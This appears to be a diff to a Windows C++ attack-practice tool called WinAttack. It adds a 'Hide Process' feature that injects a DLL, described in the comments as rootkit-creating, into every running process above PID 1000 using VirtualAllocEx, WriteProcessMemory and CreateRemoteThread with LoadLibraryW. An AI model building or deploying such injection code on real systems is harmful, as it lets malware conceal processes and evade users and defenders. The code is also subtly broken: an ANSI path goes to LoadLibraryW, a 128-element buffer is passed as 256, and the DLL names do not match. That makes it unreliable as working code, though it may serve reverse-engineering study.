@@ -1,6 +1,7 @@
 ﻿#include "framework.h"
 #include "WinAttack.h"
 #include "tlhelp32.h"
+#include "io.h"
 
 #define MAX_LOADSTRING  100
 #define ID_MAIN_LISTBOX 1000
@@ -13,6 +14,8 @@
 #define ID_DLLEJECT_BUTTON  8000
 #define ID_CODEINJECT_BUTTON  9000
 #define ID_APIHOOK_BUTTON   9010
+#define ID_HIDEPROCESS_BUTTON   9020
+#define HIDEPROCESSDLL  "stealth.dll"
 
 #define TOPMARGIN   30
 #define BOTTOMMARGIN   30
@@ -70,6 +73,7 @@ HWND hDllInjectButton;
 HWND hDllEjectButton;
 HWND hCodeInjectButton;
 HWND hAPIHookButton;
+HWND hHideProcessButton;
 
 // Function ProtoType
 ATOM                MyRegisterClass(HINSTANCE hInstance);
@@ -90,6 +94,7 @@ INT_PTR CALLBACK CodeInjectDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARA
 BOOL InjectCode();
 DWORD WINAPI InjectedThreadProc(LPVOID lParam);
 BOOL WriteFileHook();
+BOOL HideProcess();
 
 // Code Injection 할 때 패러미터를 지정하는 구조체
 typedef struct _THREAD_PARAM
@@ -281,6 +286,9 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             //API Hook 버튼을 생성
             hAPIHookButton = CreateWindow(L"button", L"WriteFile Parameter Hook\nby Debug Event", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_MULTILINE, BUTTONCORDX, BUTTONCORDY + HBUTTON * 4 + BUTTONMARGIN * 4, WBUTTON, HBUTTON, hWnd, (HMENU)ID_APIHOOK_BUTTON, hInst, NULL);
 
+            //Hide Process 버튼을 생성
+            hHideProcessButton = CreateWindow(L"button", L"Hide Process", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_MULTILINE, BUTTONCORDX, BUTTONCORDY + HBUTTON * 5 + BUTTONMARGIN * 5, WBUTTON, HBUTTON, hWnd, (HMENU)ID_HIDEPROCESS_BUTTON, hInst, NULL);
+
             //윈도우 크기 조정
             int width = HMARGIN + WLOGVIEW + HMARGIN;
             int height = TOPMARGIN + HLISTBOX + HTEXT + VMARGIN + HLOGVIEW + BOTTOMMARGIN;
@@ -416,6 +424,15 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
                 }
                 else LogViewOutput(L"WriteFile Hook", -1);
+                break;
+            case ID_HIDEPROCESS_BUTTON:
+                LogViewOutput(L"Hide Process", 100);
+                if (HideProcess())
+                {
+                    LogViewOutput(L"Hide Process", 900);
+
+                }
+                else LogViewOutput(L"Hide Process", -1);
                 break;
             default:
                 return DefWindowProc(hWnd, message, wParam, lParam);
@@ -1217,10 +1234,174 @@ BOOL WriteFileHook()
                 break;
             }
 
-            // 없어도 될 듯함
             ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
         }
     }
 
     return TRUE;
+}
+
+BOOL HideProcess()
+{
+    BOOL bResult = TRUE;
+    int indexMain = -1;
+    DWORD dwPID = NULL;  // 은폐할 프로세스의 pid
+    char szDllPath[MAX_PATH];  // 루트킷 생성 dll의 경로
+    HANDLE hSnapshot = NULL;
+    PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32 ), };
+    HANDLE hProcess, hRemoteThread;
+    LPVOID pMemAlloc;
+    LPTHREAD_START_ROUTINE  pThreadProc;
+
+    indexMain = SendMessage(hMainListBox, LB_GETCURSEL, 0, 0);
+
+    if (indexMain == -1)
+    {
+        MessageBox(g_hWnd, L"은폐할 프로세스를 선택하세요.", L"Error", MB_OK);
+        return FALSE;
+    }
+
+    dwPID = arPID[indexMain]; // 은폐할 프로세스의 pid를 셋팅
+
+    // 현재 디렉토리에 HideProcess.dll 파일이 존재하는지 체크
+    GetCurrentDirectoryA(MAX_PATH, szDllPath);
+    strcat_s(szDllPath, "\\");
+    strcat_s(szDllPath, HIDEPROCESSDLL);
+
+    if (_access(szDllPath, 0) == -1)
+    {
+        MessageBox(g_hWnd, L"현재 디렉토리에 HideProcess.dll 파일이 존재하지 않습니다.", L"Error", MB_OK);
+        return FALSE;
+    }
+
+    // 현재 실행중인 모든 프로세스 검색
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+
+    if (Process32First(hSnapshot, &pe))
+    {
+        do
+        {
+            if (_tcsicmp((LPCTSTR)GetMyFileName(), (LPCTSTR)pe.szExeFile) && pe.th32ProcessID > 1000) // 내 프로세스명은 조회 안되도록 제외시킴 && PID 가 ##보다 작은 시스템 프로세스는 제외
+            {
+                //pe.th32ProcessID; Injection 당할 PID
+                // 각 프로세스에 루트킷 생성 dll을 Injectoion함
+                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+
+                if (!hProcess)
+                {
+                    OutputDebugString(L"HideProcess Error : OpenProcess Call");
+
+                    TCHAR s[128];
+                    DWORD dwErr = GetLastError();
+                    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                        NULL,
+                        dwErr,
+                        MAKELANGID(LANG_NEUTRAL,
+                            SUBLANG_DEFAULT),
+                        s, 256, NULL);
+
+                    OutputDebugString(s);
+
+                    TCHAR s1[128];
+                    wsprintf(s1, L"pe.th32ProcessID = %d", pe.th32ProcessID);
+                    OutputDebugString(s1);
+
+                    bResult = FALSE;
+                    break;
+                }
+
+                DWORD dwAllocSize = (DWORD)(strlen(szDllPath) + 1) * sizeof(TCHAR);
+
+                pMemAlloc = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_READWRITE);
+
+                if (!pMemAlloc)
+                {
+                    OutputDebugString(L"HideProcess Error : VirtualAllocEx Call");
+                    TCHAR s[128];
+                    DWORD dwErr = GetLastError();
+                    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                        NULL,
+                        dwErr,
+                        MAKELANGID(LANG_NEUTRAL,
+                            SUBLANG_DEFAULT),
+                        s, 256, NULL);
+
+                    OutputDebugString(s);
+                    bResult = FALSE;
+                    break;
+                }
+
+                if (!WriteProcessMemory(hProcess, pMemAlloc, (LPVOID)szDllPath, dwAllocSize, NULL))
+                {
+                    OutputDebugString(L"HideProcess Error : WriteProcessMemory Call");
+                    TCHAR s[128];
+                    DWORD dwErr = GetLastError();
+                    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                        NULL,
+                        dwErr,
+                        MAKELANGID(LANG_NEUTRAL,
+                            SUBLANG_DEFAULT),
+                        s, 256, NULL);
+
+                    OutputDebugString(s);
+                    bResult = FALSE;
+                    break;
+                }
+
+                pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+
+                if (!pThreadProc)
+                {
+                    OutputDebugString(L"HideProcess Error : GetProcAddress Call");
+                    TCHAR s[128];
+                    DWORD dwErr = GetLastError();
+                    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                        NULL,
+                        dwErr,
+                        MAKELANGID(LANG_NEUTRAL,
+                            SUBLANG_DEFAULT),
+                        s, 256, NULL);
+                    OutputDebugString(s);
+                    bResult = FALSE;
+                    break;
+                }
+
+                hRemoteThread = CreateRemoteThread(hProcess,
+                    NULL,
+                    0,
+                    pThreadProc,
+                    pMemAlloc,
+                    0,
+                    NULL);
+
+                if (!hRemoteThread)
+                {
+                    OutputDebugString(L"HideProcess Error : CreateRemoteThread Call");
+                    TCHAR s[128];
+                    DWORD dwErr = GetLastError();
+                    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                        NULL,
+                        dwErr,
+                        MAKELANGID(LANG_NEUTRAL,
+                            SUBLANG_DEFAULT),
+                        s, 256, NULL);
+
+                    OutputDebugString(s);
+                    bResult = FALSE;
+                    break;
+                }
+
+                WaitForSingleObject(hRemoteThread, INFINITE);
+
+                CloseHandle(hRemoteThread);
+                CloseHandle(hProcess);
+
+
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+
+    CloseHandle(hSnapshot);
+
+    return bResult;
 }
